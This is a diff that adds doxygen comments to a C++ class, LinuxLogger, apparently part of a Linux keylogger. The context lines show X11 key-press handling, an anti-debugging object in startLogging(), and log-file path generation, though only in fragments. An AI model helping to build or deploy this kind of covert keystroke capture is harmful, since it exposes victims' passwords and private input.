@@ -14,6 +14,9 @@
 
 #if defined(__linux__)
 
+/**
+ * @brief Construct a new Linux Logger:: Linux Logger object
+ */
 LinuxLogger::LinuxLogger()
 {
     logFilePath = generateLogFilePath();
@@ -33,6 +36,9 @@ LinuxLogger::LinuxLogger()
     isRunning = true;
 }
 
+/**
+ * @brief Destroy the Linux Logger:: Linux Logger object
+ */
 LinuxLogger::~LinuxLogger()
 {
     if (display)
@@ -45,6 +51,9 @@ LinuxLogger::~LinuxLogger()
     }
 }
 
+/**
+ * @brief This method will start the keylogger on Linux.
+ */
 void LinuxLogger::startLogging()
 {
     AntiDebug ad;
@@ -73,6 +82,10 @@ void LinuxLogger::startLogging()
     }
 }
 
+/**
+ * @brief This method will handle the key press event.
+ * @param event -> The key press event.
+ */
 void LinuxLogger::handleKeyPress(XKeyEvent* event)
 {
     char key[255];
@@ -92,6 +105,10 @@ void LinuxLogger::handleKeyPress(XKeyEvent* event)
     }
 }
 
+/**
+ * @brief This method will generate the log file path.
+ * @return std::string -> The log file path.
+ */
 std::string LinuxLogger::generateLogFilePath() const
 {
     auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
